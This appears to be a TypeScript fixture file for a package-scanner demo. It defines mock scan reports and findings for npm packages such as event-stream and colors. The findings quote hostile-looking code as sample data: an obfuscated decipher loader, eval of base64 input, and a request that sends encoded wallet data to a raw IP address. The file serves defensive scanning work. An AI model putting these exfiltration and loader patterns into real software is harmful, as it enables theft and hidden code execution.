/* ============================================================
 * mock/data.ts — demo fixtures for the in-browser mock backend.
 *
 * Shapes match the shared contracts exactly (ReportSchema, ScanRecord,
 * Finding, ResolvedPackage). These are used ONLY when the API client runs in
 * mock mode (see `api.ts`). With a real backend they are ignored.
 * ============================================================ */
import type {
  Finding,
  ReportSchema,
  ResolvedPackage,
  ScanRecord,
} from "@shared/contracts";

export const THRESHOLD = 50; // default threshold T (record carries thresholdUsed)
const ORIGIN = "https://packguard.dev"; // mock public report host

function enc(name: string): string {
  return name.replace("/", "%2F");
}
export function reportKey(n: string, v: string): string {
  return "reports/" + enc(n) + "/" + v + "/report.json";
}
export function sourceKey(n: string, v: string): string {
  return "sources/" + enc(n) + "/" + v + "/source.tgz";
}
export function reportUrl(n: string, v: string): string {
  return ORIGIN + "/r/" + enc(n) + "/" + v;
}

// ---- Findings catalogues (the actual risky source lines) ----------
const F_EVENTSTREAM: Finding[] = [
  {
    category: "Obfuscated payload (Semgrep)",
    filePath: "test/data.js",
    lineNumber: 1,
    severity: "CRITICAL",
    codeSnippet:
      'module.exports=function(e){...n=Buffer.from(t,"hex").toString();return require("crypto").createDecipher("aes256",e)...}',
  },
  {
    category: "Dynamic require of decoded module (Semgrep)",
    filePath: "index.js",
    lineNumber: 56,
    severity: "CRITICAL",
    codeSnippet: "require(decode(payload))(process.env.npm_package_description);",
  },
  {
    category: "Hardcoded credential (Gitleaks)",
    filePath: "lib/upload.js",
    lineNumber: 42,
    severity: "HIGH",
    codeSnippet: 'const TOKEN = "sk_live_" + "REDACTED_DEMO_FIXTURE_NOT_A_REAL_KEY";',
  },
  {
    category: "Suspicious outbound request (Semgrep)",
    filePath: "lib/upload.js",
    lineNumber: 88,
    severity: "HIGH",
    codeSnippet: "https.request('http://185.62.188.117/collect?d=' + b64(wallet), cb);",
  },
  {
    category: "Use of eval() (Semgrep)",
    filePath: "lib/loader.js",
    lineNumber: 17,
    severity: "MEDIUM",
    codeSnippet: "eval(Buffer.from(p, 'base64').toString('utf8'));",
  },
];

const F_COLORS: Finding[] = [
  {
    category: "Infinite loop / DoS pattern (Semgrep)",
    filePath: "lib/index.js",
    lineNumber: 0, // unspecified line → "unspecified line"
    severity: "HIGH",
    codeSnippet: "for (let i = 666; i < Infinity; i++) { console.log(zalgo(am)); }",
  },
  {
    category: "Unexpected console output in module scope (Semgrep)",
    filePath: "lib/custom/zalgo.js",
    lineNumber: 24,
    severity: "MEDIUM",
    codeSnippet: "process.stdout.write(corrupt(text));",
  },
  {
    category: "Use of process.argv without validation (Semgrep)",
    filePath: "examples/normal-use.js",
    lineNumber: 12,
    severity: "LOW",
    codeSnippet: "", // empty snippet → "Source line unavailable."
  },
];

const F_CHALK: Finding[] = [
  {
    category: "Access to process.env (Semgrep)",
    filePath: "source/index.js",
    lineNumber: 31,
    severity: "LOW",
    codeSnippet: "const { env } = process;",
  },
];

// ---- ReportSchema fixtures, keyed by package name -----------------
export const REPORTS: Record<string, ReportSchema> = {
  "left-pad": {
    packageName: "left-pad",
    version: "1.3.0",
    verdict: "SAFE",
    riskScore: 4,
    findings: [],
  },
  lodash: {
    packageName: "lodash",
    version: "4.17.21",
    verdict: "SAFE",
    riskScore: 9,
    findings: [],
  },
  chalk: {
    packageName: "chalk",
    version: "5.3.0",
    verdict: "SAFE",
    riskScore: 16,
    findings: F_CHALK,
  },
  "@vue/reactivity": {
    packageName: "@vue/reactivity",
    version: "3.4.21",
    verdict: "SAFE",
    riskScore: 11,
    findings: [],
  },
  "event-stream": {
    packageName: "event-stream",
    version: "3.3.6",
    verdict: "RISKY",
    riskScore: 91,
    findings: F_EVENTSTREAM,
  },
  colors: {
    packageName: "colors",
    version: "1.4.44-liberty.2",
    verdict: "RISKY",
    riskScore: 68,
    findings: F_COLORS,
  },
};

// ---- ResolvedPackage fixtures (npm registry tarball urls) ---------
export function resolved(name: string): ResolvedPackage {
  const r = REPORTS[name];
  const ver = r ? r.version : "1.0.0";
  const base = name.indexOf("/") > -1 ? name.split("/")[1] : name;
  return {
    packageName: name,
    version: ver,
    tarballUrl: "https://registry.npmjs.org/" + name + "/-/" + base + "-" + ver + ".tgz",
    integrity: "sha512-" + btoa(name + ver).replace(/=/g, "").slice(0, 44),
  };
}

interface RecordOpts {
  version?: string;
  nullUrl?: boolean;
  createdAt?: string;
}

// ---- Build a ScanRecord from a report -----------------------------
export function recordFor(name: string, opts: RecordOpts = {}): ScanRecord {
  const r = REPORTS[name];
  const ver = opts.version || r.version;
  return {
    packageName: name,
    version: ver,
    verdict: r.verdict,
    riskScore: r.riskScore,
    thresholdUsed: THRESHOLD,
    publicReportUrl: opts.nullUrl ? null : reportUrl(name, ver),
    reportKey: reportKey(name, ver),
    sourceKey: sourceKey(name, ver),
    createdAt: opts.createdAt || new Date().toISOString(),
  };
}

// ---- Gallery seed (newest first; includes multi-version + null url)
const now = Date.now();
function ago(mins: number): string {
  return new Date(now - mins * 60000).toISOString();
}

export const GALLERY_SEED: ScanRecord[] = [
  recordFor("event-stream", { createdAt: ago(12) }),
  recordFor("chalk", { createdAt: ago(48) }),
  recordFor("colors", { createdAt: ago(140) }),
  recordFor("lodash", { createdAt: ago(190) }),
  // a second version of lodash → distinct entry
  { ...recordFor("lodash", { version: "4.17.20", createdAt: ago(2 * 1440) }), riskScore: 9 },
  recordFor("left-pad", { createdAt: ago(3 * 1440) }),
  // url generation failed for this one → publicReportUrl null
  recordFor("@vue/reactivity", { nullUrl: true, createdAt: ago(5 * 1440) }),
];

/**
 * Package names that intentionally trigger error branches for the demo — type
 * the name to force that failure mode through the mock client.
 */
export const ERROR_TRIGGERS: Record<string, string> = {
  "does-not-exist-pkg": "PACKAGE_UNRESOLVED",
  "@@@invalid name": "INVALID_PACKAGE_NAME",
  "registry-down": "REGISTRY_UNAVAILABLE",
  "huge-package": "DOWNLOAD_TOO_LARGE",
  "evil-symlink": "LINK_TARGET_ESCAPE",
  "no-vscode": "VSCODE_UNAVAILABLE",
};
